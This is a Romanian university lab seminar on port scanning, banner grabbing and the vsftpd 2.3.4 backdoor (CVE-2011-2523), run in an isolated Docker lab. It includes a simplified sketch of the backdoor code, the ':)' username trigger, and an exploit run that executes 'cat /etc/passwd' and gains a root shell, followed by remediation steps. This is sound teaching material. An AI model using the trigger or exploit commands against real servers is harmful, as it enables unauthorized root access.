# SEMINAR 13 - Securitatea în Rețelele de Calculatoare
## Scanare de Porturi și Testarea Vulnerabilităților Simple

**Durată totală**: 120 minute (2 ore)
**Tip activitate**: Dezvoltare asistată de cod + Utilizare asistată de unelte de securitate
**Cerințe**: Python 3.8+, Docker, acces terminal, permisiuni root/sudo

---

## STRUCTURA LABORATORULUI

```
┌─────────────────────────────────────────────────────────────────────┐
│  FAZA 1: Setup & Recunoaștere (25 min)                              │
├─────────────────────────────────────────────────────────────────────┤
│  FAZA 2: Scanare Activă (35 min)                                    │
├─────────────────────────────────────────────────────────────────────┤
│  FAZA 3: Analiza Vulnerabilităților (35 min)                        │
├─────────────────────────────────────────────────────────────────────┤
│  FAZA 4: Demonstrație Exploit & Remediere (20 min)                  │
├─────────────────────────────────────────────────────────────────────┤
│  FAZA 5: Wrap-up & Evaluare (5 min)                                 │
└─────────────────────────────────────────────────────────────────────┘
```

---

## SLIDE 1: Titlu

**SEMINAR 13**
# Securitatea în Rețelele de Calculatoare

### Scanare de Porturi și Testarea Vulnerabilităților Simple

**Curs**: Rețele de Calculatoare
**An universitar**: 2025-2026
**Semestrul**: 2

*ASE București - Facultatea CSIE*

---

## SLIDE 2: Obiective Operaționale

La finalul acestui laborator, veți fi capabili să:

1. **Configurați** un mediu de testare izolat cu Docker
2. **Implementați** un scanner de porturi TCP în Python
3. **Identificați** servicii vulnerabile prin banner grabbing
4. **Analizați** traficul de rețea cu Wireshark/tcpdump
5. **Demonstrați** exploatarea unei vulnerabilități cunoscute (CVE)
6. **Aplicați** măsuri de remediere și hardening

**Evaluare**: Fișier REZULTATE_S13.txt cu output-uri, screenshots, răspunsuri

---

## SLIDE 3: Agenda Detaliată

| Oră | Activitate | Metodă |
|-----|-----------|--------|
| 0:00-0:10 | Setup mediu Docker | Comandă ghidată |
| 0:10-0:25 | Recunoaștere pasivă | Observație + discuție |
| 0:25-0:45 | Scanner porturi - dezvoltare | Cod asistat |
| 0:45-0:60 | Banner grabbing | Cod asistat |
| 0:60-0:75 | Vulnerability checker | Cod + analiză |
| 0:75-0:95 | Demonstrație exploit CVE | Observație + discuție |
| 0:95-1:10 | Remediere și hardening | Configurare asistată |
| 1:10-1:20 | Finalizare & upload | Individual |

---

## SLIDE 4: Topologia Laboratorului

```
                    ┌─────────────────────┐
                    │   ATTACKER HOST     │
                    │   (Mașina voastră)  │
                    │   172.20.0.1        │
                    └─────────┬───────────┘
                              │
              ┌───────────────┴───────────────┐
              │     DOCKER NETWORK            │
              │     pentestnet                │
              │     172.20.0.0/24             │
              └───────────────────────────────┘
                    │         │         │
         ┌──────────┴──┐ ┌────┴────┐ ┌──┴──────────┐
         │   DVWA      │ │ WebGoat │ │   vsftpd    │
         │ 172.20.0.10 │ │  .0.11  │ │   .0.12     │
         │ :8888 (HTTP)│ │ :8080   │ │ :2121 (FTP) │
         │ SQLi, XSS   │ │ OWASP   │ │ CVE-2011-   │
         │             │ │ lessons │ │    2523     │
         └─────────────┘ └─────────┘ └─────────────┘
```

**Notă**: Toate serviciile sunt *intenționat vulnerabile* - doar pentru mediu izolat!

---

## SLIDE 5: Faza 1 - Pregătirea Mediului

### Pași de Setup (Terminal)

```bash
# 1. Navigare în directorul starterkit
cd starterkit_s13

# 2. Instalare dependențe Python
make setup

# 3. Pornire infrastructură Docker
make docker-up

# 4. Verificare servicii active
docker ps --format "table {{.Names}}\t{{.Ports}}\t{{.Status}}"
```

### Output Așteptat

```
NAMES         PORTS                    STATUS
dvwa          0.0.0.0:8888->80/tcp     Up 30 seconds (healthy)
webgoat       0.0.0.0:8080->8080/tcp   Up 30 seconds
vsftpd        0.0.0.0:2121->21/tcp     Up 30 seconds
              0.0.0.0:6200->6200/tcp
```

**Checkpoint**: Confirmați că vedeți 3 containere cu status "Up"

---

## SLIDE 6: Verificare Acces Servicii

### Test browser (DVWA)

1. Deschideți: `http://localhost:8888`
2. Login: `admin` / `password`
3. Click: "Create / Reset Database"
4. Setați: DVWA Security → **Low**

### Test browser (WebGoat)

1. Deschideți: `http://localhost:8080/WebGoat`
2. Register user nou sau login existent

### Test terminal (FTP)

```bash
# Test conectivitate FTP
nc -vz localhost 2121
# Output așteptat: Connection to localhost 2121 port [tcp/*] succeeded!
```

---

## SLIDE 7: Faza 2 - Concepte: Scanare Porturi

### Ce este scanarea de porturi?

**Definiție**: Procesul sistematic de interogare a porturilor TCP/UDP pentru a determina starea lor (deschis/închis/filtrat).

### Tipuri de scanări

| Tip | Metodă | Detectabilitate | Viteză |
|-----|--------|-----------------|--------|
| **TCP Connect** | Handshake complet | Ridicată | Medie |
| **SYN Scan** | Half-open (SYN→SYN-ACK) | Medie | Rapidă |
| **UDP Scan** | Datagramă + ICMP | Scăzută | Lentă |
| **ACK Scan** | Detectare firewall | Medie | Rapidă |

**Azi vom implementa**: TCP Connect Scan (nu necesită privilegii root)

---

## SLIDE 8: Exercițiu 1 - Port Scanner (Partea 1)

### Deschideți fișierul: `python/exercises/ex_01_port_scanner.py`

```python
# Secțiunea STUDENT - Completați funcția de scanare
def scan_port(target: str, port: int, timeout: float = 1.0) -> PortResult:
    """
    Scanează un singur port TCP.
    
    Algoritmul:
    1. Creează socket TCP
    2. Setează timeout
    3. Încearcă connect_ex() - returnează 0 dacă portul e deschis
    4. Închide socket-ul
    
    Returns:
        PortResult cu state='open'/'closed'/'filtered'
    """
    # TODO: Implementați conform algoritmului de mai sus
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    result = sock.connect_ex((target, port))
    sock.close()
    
    if result == 0:
        return PortResult(port=port, state='open')
    elif result == errno.ECONNREFUSED:
        return PortResult(port=port, state='closed')
    else:
        return PortResult(port=port, state='filtered')
```

---

## SLIDE 9: Exercițiu 1 - Port Scanner (Partea 2)

### Rulați scanner-ul

```bash
# Scanare target principal - porturi comune
make scan TARGET=172.20.0.10

# Sau direct cu Python
python python/exercises/ex_01_port_scanner.py 172.20.0.10 -p 1-1024

# Scanare rapidă doar porturi web
python python/exercises/ex_01_port_scanner.py 172.20.0.10 -p 80,443,8080,8888
```

### Analizați output-ul

```
[*] Scanning 172.20.0.10 (1024 ports)
[+] 172.20.0.10:80   OPEN   (http)
[+] 172.20.0.10:443  OPEN   (https)

Scan completed in 12.34s
Open ports: 2 | Closed: 1022 | Filtered: 0
```

**Întrebare pentru studenți**: De ce unele porturi apar ca "filtered"?

---

## SLIDE 10: Banner Grabbing - Teorie

### Ce este Banner Grabbing?

**Definiție**: Tehnica de extragere a informațiilor despre serviciul care rulează pe un port, prin citirea mesajului de bun venit (banner).

### Informații extrase tipic

- **Numele serviciului** (Apache, nginx, vsftpd)
- **Versiunea** software-ului
- **Sistemul de operare** (uneori)
- **Configurații** neobișnuite

### De ce e important?

```
vsftpd 2.3.4    →  CVE-2011-2523 (backdoor!)
OpenSSH 7.4     →  Verificare dacă e patch-uit
Apache 2.4.49   →  CVE-2021-41773 (path traversal)
```

---

## SLIDE 11: Exercițiu 2 - Banner Grabbing

### Rulați banner grabber-ul

```bash
# Extrage banner FTP
python python/exploits/banner_grabber.py 172.20.0.12 -p 2121

# Output așteptat:
# [+] 172.20.0.12:2121
#     Banner: 220 (vsFTPd 2.3.4)
#     Protocol: FTP
#     Version: 2.3.4
```

### Interpretare

| Banner | Semnificație | Risc |
|--------|--------------|------|
| `vsFTPd 2.3.4` | Versiune vulnerabilă | **CRITIC** |
| `Apache/2.4.41` | Server web standard | Mediu |
| `OpenSSH_8.4p1` | SSH actualizat | Scăzut |

**Notați în REZULTATE_S13.txt**: Ce versiune vsftpd ați detectat?

---

## SLIDE 12: Faza 3 - Vulnerability Checking

### Rulați vulnerability checker

```bash
# Verificare automată vulnerabilități
python python/exercises/ex_04_vuln_checker.py 172.20.0.12 \
    --service ftp \
    --port 2121
```

### Output tipic

```json
{
  "target": "172.20.0.12",
  "port": 2121,
  "service": "ftp",
  "vulnerabilities": [
    {
      "cve": "CVE-2011-2523",
      "name": "vsftpd 2.3.4 Backdoor",
      "severity": "CRITICAL",
      "cvss": 10.0,
      "description": "Backdoor în vsftpd permite execuție cod arbitrar"
    }
  ],
  "checks_passed": ["banner_extracted"],
  "checks_failed": ["version_outdated", "backdoor_vulnerable"]
}
```

---

## SLIDE 13: Analiza CVE-2011-2523

### Cronologie

```
Iunie 2011     Atacator necunoscut modifică codul sursă vsftpd
│
▼
30 Iunie 2011  Versiunea 2.3.4 publicată pe vsftpd.beasts.org
│              (conține backdoor-ul)
▼
3 Iulie 2011   Backdoor descoperit, versiunea retrasă
│
▼
4 Iulie 2011   CVE-2011-2523 atribuit, patch disponibil
```

### Mecanismul backdoor-ului

1. Atacatorul trimite username cu sufixul `:)` (smiley)
2. Codul verifică prezența "smiley-ului" în username
3. Dacă există → deschide port 6200 cu shell root
4. Atacatorul se conectează la portul 6200 → acces complet

---

## SLIDE 14: Anatomia Backdoor-ului

### Codul malițios (simplificat)

```c
// În str.c - funcția vsf_sysutil_check_password()
if (strstr(p_user, ":)") != NULL) {
    // Backdoor trigger!
    int fd = socket(...);
    bind(fd, port 6200);
    listen(fd, ...);
    // Fork shell pentru conexiuni noi
    if (fork() == 0) {
        execl("/bin/sh", "sh", NULL);
    }
}
```

### De ce a fost greu de detectat?

1. **Cod minim** - doar câteva linii
2. **Ascuns în funcție legitimă** - verificare parolă
3. **Trigger obscur** - cine verifică username pentru `:)`?
4. **Fără loguri** - nu lasă urme în log-uri

---

## SLIDE 15: Faza 4 - Demonstrație Exploit

### ⚠️ ATENȚIE: Doar în mediu controlat!

```bash
# Demonstrație exploit (DOAR observație!)
python python/exploits/ftp_backdoor_vsftpd.py 172.20.0.12 \
    --port 2121 \
    --command "id; hostname; cat /etc/passwd | head -5"
```

### Output (demonstrație)

```
[*] Connecting to 172.20.0.12:2121...
[+] Banner: 220 (vsFTPd 2.3.4)
[*] Sending backdoor trigger (USER test:))...
[*] Waiting for backdoor port 6200...
[+] Backdoor port open! Connecting...
[+] Shell obtained!

uid=0(root) gid=0(root) groups=0(root)
vsftpd-container
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Întrebare etică**: Ce ar face un atacator cu acest acces?

---

## SLIDE 16: Captura Traficului

### Pornire captură Wireshark/tcpdump

```bash
# Terminal 1: Pornește captura
make capture-start IF=docker0

# Terminal 2: Rulează exploit-ul
python python/exploits/ftp_backdoor_vsftpd.py 172.20.0.12 ...

# Terminal 1: Oprește captura
make capture-stop
```

### Analiză în Wireshark

1. Deschideți `captures/capture_*.pcap`
2. Filtru: `ftp || tcp.port == 6200`
3. Identificați:
   - Pachetele FTP cu "USER test:)"
   - Conexiunea nouă pe portul 6200
   - Comenzile executate în shell

**Notați în REZULTATE_S13.txt**: Screenshot cu pachete relevante

---

## SLIDE 17: Măsuri de Remediere

### Nivel 1: Patch imediat

```bash
# Actualizare la versiune sigură
apt-get update && apt-get install vsftpd  # Ultima versiune din repo

# Sau instalare din sursă (versiunea curentă e sigură)
wget https://security.appspot.com/downloads/vsftpd-3.0.5.tar.gz
```

### Nivel 2: Configurare defensivă

```bash
# /etc/vsftpd.conf
anonymous_enable=NO
local_enable=YES
write_enable=NO
chroot_local_user=YES
allow_writeable_chroot=NO
pasv_enable=NO
```

### Nivel 3: Firewall și segmentare

```bash
# iptables - restricționare acces FTP
iptables -A INPUT -p tcp --dport 21 -s 10.0.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j DROP
```

---

## SLIDE 18: Defense in Depth

```
┌─────────────────────────────────────────────────────────────────┐
│                    STRATIFICARE SECURITATE                       │
├─────────────────────────────────────────────────────────────────┤
│  Layer 1: PERIMETRU                                              │
│  ├── Firewall (iptables, pf)                                    │
│  ├── IDS/IPS (Snort, Suricata)                                  │
│  └── WAF (ModSecurity)                                          │
├─────────────────────────────────────────────────────────────────┤
│  Layer 2: REȚEA                                                  │
│  ├── Segmentare VLAN                                            │
│  ├── Network ACL                                                │
│  └── TLS pentru comunicații                                     │
├─────────────────────────────────────────────────────────────────┤
│  Layer 3: HOST                                                   │
│  ├── Patching regulat                                           │
│  ├── Minimal privileges (least privilege)                       │
│  └── Logging și monitorizare                                    │
├─────────────────────────────────────────────────────────────────┤
│  Layer 4: APLICAȚIE                                              │
│  ├── Input validation                                           │
│  ├── Autentificare puternică                                    │
│  └── Cod review și audit                                        │
└─────────────────────────────────────────────────────────────────┘
```

---

## SLIDE 19: Exercițiu - Implementare Măsuri

### Configurați TLS pentru MQTT

```bash
# 1. Generați certificate (deja făcut la setup)
make setup

# 2. Verificați diferența între conexiune plain și TLS
# Plain (nesigur):
python python/exercises/ex_02_mqtt_client.py \
    --broker 172.20.0.100 --port 1883 --mode sensor

# TLS (sigur):
python python/exercises/ex_02_mqtt_client.py \
    --broker 172.20.0.100 --port 8883 --tls \
    --ca-cert configs/certs/ca.crt --mode sensor
```

### Observați în Wireshark

- **Port 1883**: Payload vizibil în plaintext
- **Port 8883**: Payload criptat, handshake TLS vizibil

---

## SLIDE 20: Faza 5 - Finalizare

### Conținut REZULTATE_S13.txt

```markdown
# Rezultate Seminar 13 - Securitate Rețele

## Informații student
- Nume: [Numele vostru]
- Grupă: [Grupa]
- Data: [Data laboratorului]

## Exercițiul 1: Port Scanning
- Porturi deschise găsite pe 172.20.0.10: [lista]
- Porturi deschise găsite pe 172.20.0.12: [lista]
- Timp total scanare: [X secunde]

## Exercițiul 2: Banner Grabbing
- Versiune vsftpd detectată: [versiunea]
- Este vulnerabil CVE-2011-2523? [Da/Nu]

## Exercițiul 3: Captură trafic
[Atașați screenshot Wireshark cu pachetele FTP]

## Întrebări de reflecție
1. De ce vsftpd 2.3.4 este periculos?
   [Răspunsul vostru]

2. Numiți 3 măsuri pentru prevenirea acestui tip de atac:
   - [Măsura 1]
   - [Măsura 2]
   - [Măsura 3]

3. Ce diferență observați între traficul MQTT plain vs TLS?
   [Răspunsul vostru]
```

---

## SLIDE 21: Cleanup și Upload

### Comenzi de finalizare

```bash
# Oprire infrastructură
make docker-down

# Cleanup complet
make clean-all

# Verificare că nu au rămas containere
docker ps -a
```

### Submisie

1. Salvați fișierul `REZULTATE_S13.txt`
2. Includeți screenshots (Wireshark, terminale)
3. Încărcați pe platforma de evaluare

---

## SLIDE 22: Resurse Suplimentare

### Documentație oficială

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [CVE Database](https://cve.mitre.org/)

### Platforme de practică (legale)

- [Hack The Box](https://www.hackthebox.eu/) - CTF și mașini vulnerabile
- [TryHackMe](https://tryhackme.com/) - Cursuri ghidate
- [VulnHub](https://www.vulnhub.com/) - VM-uri vulnerabile descărcabile

### Certificări relevante

- **CompTIA Security+** - Fundamente securitate
- **CEH** - Certified Ethical Hacker
- **OSCP** - Offensive Security Certified Professional

---

## SLIDE 23: Q&A

### Întrebări frecvente

**Q: E legal să scanez rețele?**
A: Doar cu acordul explicit al proprietarului. Scanarea neautorizată = infracțiune.

**Q: Cum mă protejez ca dezvoltator?**
A: Verificați dependențele (npm audit, pip-audit), patch-uri regulate, code review.

**Q: Care e diferența dintre pentest și hacking?**
A: Pentesting = autorizat, documentat, etic. Hacking neautorizat = ilegal.

---

## ANEXĂ: Cheat Sheet Comenzi

```bash
# === SETUP ===
make setup                    # Instalare dependențe
make docker-up               # Pornire containere

# === SCANARE ===
make scan TARGET=IP          # Port scan
make scan TARGET=IP PORTS=1-1024  # Cu range specific

# === MQTT ===
make mqtt-pub TOPIC=test MSG="hello"  # Publish
make mqtt-sub TOPIC=test             # Subscribe

# === CAPTURA ===
make capture-start IF=docker0   # Start tcpdump
make capture-stop              # Stop și salvează

# === EXPLOIT (doar demo) ===
make exploit-ftp TARGET=172.20.0.12

# === CLEANUP ===
make docker-down             # Oprire containere
make clean-all               # Cleanup complet
```

---

## ANEXĂ: Troubleshooting

| Problemă | Cauză | Soluție |
|----------|-------|---------|
| "Connection refused" | Serviciu nefuncțional | `docker-compose restart` |
| "Permission denied" | Lipsă drepturi | `sudo make ...` sau adaugă user la grup docker |
| "Module not found" | Dependențe lipsă | `make setup` |
| Wireshark nu vede trafic | Interfață greșită | Selectează `docker0` sau `any` |
| Exploit timeout | Firewall/versiune | Verifică că e vsftpd 2.3.4 |

---

*Document generat pentru Seminar 13 - Rețele de Calculatoare*
*ASE București, CSIE, 2025-2026*
